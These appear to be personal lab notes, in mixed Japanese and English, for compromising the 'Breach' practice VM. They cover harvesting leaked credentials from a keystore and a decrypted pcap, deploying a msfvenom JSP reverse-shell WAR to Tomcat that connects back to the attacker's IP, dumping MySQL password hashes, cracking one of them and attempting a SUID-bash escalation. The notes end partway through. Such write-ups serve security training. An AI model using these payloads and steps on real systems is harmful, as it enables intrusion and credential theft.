http://192.168.110.140/impresscms/

![[Initial access image.png]]

http://192.168.110.140/impresscms/viewpmsg.php

![[Initial access image 1.png]]

http://192.168.110.140/impresscms/readpmsg.php?start=0&total_messages=3

![[Initial access image 2.png]]

192.168.110.140/.keystore

http://192.168.110.140/.keystore

![[Initial access image 3.png]]

pgibbons:damnitfeel$goodtobeagang$ta

![[Initial access image 4.png]]

searchにpeterを入力して実行する

![[Initial access image 5.png]]

Content	> SSL implementation test capture

SSL implementation test capture Edit Delete

Published by Peter Gibbons on 2016/6/4 21:37:05. (0 reads)

Team - I have uploaded a pcap file of our red team's re-production of the attack. I am not sure what trickery they were using but I cannot read the file. I tried every nmap switch from my C|EH studies and just cannot figure it out. http://192.168.110.140/impresscms/_SSL_test_phase1.pcap They told me the alias, ==🟡storepassword and keypassword are all set to 'tomcat'.== Is that useful?? Does anyone know what this is? I guess we are securely encrypted now? -Peter p.s. I'm going fishing for the next 2 days and will not have access to email or phone.

![[Initial access image 6.png]]

http://192.168.110.140/impresscms/_SSL_test_phase1.pcap

![[Initial access image 7.png]]

keystoreファイルから秘密キーをエクスポートする

HTTPストリームの参照

GET /_M@nag3Me/html HTTP/1.1

Host: 192.168.110.140:8443

Authorization: Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC

![[Initial access image 8.png]]

エンコード

└─# echo dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC | base64 -d

tomcat:Tt\5D8F(#!*u=G)4m7zB

![[Initial access image 9.png]]

I tried Sign in to the site After BurpSuite and FoxyProxy settings

![[Initial access image 10.png]]

I found war file upload Deploy contents.

![[Initial access image 11.png]]

Creation code of payload.

└─# ==🟡msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.99 LPORT=1234 -f war -o revshell.war==

Payload size: 1100 bytes

Final size of war file: 1100 bytes

Saved as: revshell.war

└─$ nc -nlvp 1234

listening on \[any\] 1234 ...

connect to \[192.168.110.99\] from (UNKNOWN) \[192.168.110.140\] 51264

![[Initial access image 12.png]]

tomcat6@Breach:/var/lib/tomcat6$ find / -perm -4000 -type f 2>/dev/null

find / -perm -4000 -type f 2>/dev/null

/bin/su

/bin/fusermount

/bin/umount

/bin/ping6

/bin/mount

/bin/ping

/usr/bin/mtr

/usr/bin/chfn

/usr/bin/newgrp

/usr/bin/sudo

/usr/bin/traceroute6.iputils

/usr/bin/at

/usr/bin/chsh

/usr/bin/gpasswd

/usr/bin/passwd

/usr/bin/pkexec

/usr/lib/policykit-1/polkit-agent-helper-1

/usr/lib/openssh/ssh-keysign

/usr/lib/dbus-1.0/dbus-daemon-launch-helper

/usr/lib/eject/dmcrypt-get-device

/usr/lib/authbind/helper

/usr/sbin/uuidd

/usr/sbin/pppd

![[Initial access image 13.png]]

tomcat6@Breach:/var/www/5446$ ls -la

ls -la

total 24

drwxrwxrwx 4 www-data www-data 4096 May 24  2016 .

drwxr-xr-x 4 www-data www-data 4096 May 24  2016 ..

-rw-r--r-- 1 www-data www-data 1672 May 24  2016 0d93f85c5061c44cdffeb8381b2772fd.php

drwxr-xr-x 3 www-data www-data 4096 May 24  2016 cache

-rw-r--r-- 1 www-data www-data 1671 May 24  2016 fe4db1f7bc038d60776dcb66ab3404d5.php

drwxrwxrwx 3 www-data www-data 4096 May 24  2016 modules

tomcat6@Breach:/var/www/5446$ cat 0d93f85c5061c44cdffeb8381b2772fd.php

cat 0d93f85c5061c44cdffeb8381b2772fd.php

\<?php

/**

\* All information in order to connect to database are going through here.

-

\* Be careful if you are changing data's in this file.

-

\* @copyright    http://www.xoops.org/ The XOOPS Project

\* @copyright    XOOPS_copyrights.txt

\* @copyright    http://www.impresscms.org/ The ImpressCMS Project

\* @license              http://www.gnu.org/licenses/old-licenses/gpl-2.0.html GNU General Public License (GPL)

\* @package              installer

\* @since                1.0

\* @author               marcan \<marcan@impresscms.org>

\* @author          Sina Asghari (aka stranger) \<pesian_stranger@users.sourceforge.net>

\* @version              $Id: sdata.dist.php 8570 2009-04-11 13:15:53Z icmsunderdog $

*/

// Database Hostname

// Hostname of the database server. If you are unsure, 'localhost' works in most cases.

define( 'SDATA_DB_HOST', 'localhost' );

// Database Username

// Your database user account on the host

==🟡define( 'SDATA_DB_USER', 'root' );==

// Database Password

// Password for your database user account

==🟡define( 'SDATA_DB_PASS', '' );==

// Database Name

// The name of database on the host. The installer will attempt to create the database if not exist

define( 'SDATA_DB_NAME', 'impresscms' );

// Table Prefix

// This prefix will be added to all new tables created to avoid name conflict in the database. If you are unsure, just use the default 'icms'

define( 'SDATA_DB_PREFIX', 'ia44db101' );

// Password Salt Key $mainSalt

// This salt will be appended to passwords in the icms_encryptPass() function.

// Do NOT change this once your site is Live, doing so will invalidate everyones Password.

define( 'SDATA_DB_SALT', 'EQ9eLioElpacrtYZFQrGiDvB5OQGXzq2jfA4okdsZzkVNGhka6blxUTrozLOuFSA4' );

![[Initial access image 14.png]]

tomcat6@Breach:/var/www/5446$ mysql -u root

mysql -u root

Welcome to the MySQL monitor.  Commands end with ; or \g.

Your MySQL connection id is 37

Server version: 5.5.49-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its

affiliates. Other names may be trademarks of their respective

owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;

show databases;

+--------------------+

\| Database           |

+--------------------+

\| information_schema |

\| impresscms         |

\| mysql              |

\| performance_schema |

+--------------------+

4 rows in set (0.01 sec)

![[Initial access image 15.png]]

mysql> use mysql

use mysql

Database changed

mysql> show tables;

show tables;

+---------------------------+

\| Tables_in_mysql           |

+---------------------------+

\| columns_priv              |

\| db                        |

\| event                     |

\| func                      |

\| general_log               |

\| help_category             |

\| help_keyword              |

\| help_relation             |

\| help_topic                |

\| host                      |

\| ndb_binlog_index          |

\| plugin                    |

\| proc                      |

\| procs_priv                |

\| proxies_priv              |

\| servers                   |

\| slow_log                  |

\| tables_priv               |

\| time_zone                 |

\| time_zone_leap_second     |

\| time_zone_name            |

\| time_zone_transition      |

\| time_zone_transition_type |

\| user                      |

+---------------------------+

24 rows in set (0.00 sec)

![[Initial access image 16.png]]

mysql> select * from user;

select * from user;

+-----------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+

\| Host      | User             | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin | authentication_string |

+-----------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+

\| localhost | root             |                                           | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |

\|           | milton           | 6450d89bd3aff1d893b85d3ad65d2ec2          | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 |        | NULL                  |

\| 127.0.0.1 | root             |                                           | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |

\| ::1       | root             |                                           | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |

\| localhost | debian-sys-maint | *A9523939F1B2F3E72A4306C34F225ACF09590878 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        | NULL                  |

+-----------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+

5 rows in set (0.00 sec)

![[Initial access image 17.png]]

https://hashes.com/en/decrypt/hash

6450d89bd3aff1d893b85d3ad65d2ec2:thelaststraw

![[Initial access image 18.png]]

admグループで実行できるファイルの探索

***find / -group adm 2>/dev/null***

/var/log/syslog

![[Initial access image 19.png]]

milton@Breach:/var/www/5446$ cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash;

h; /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbas

![[Initial access image 20.png]]

ここまで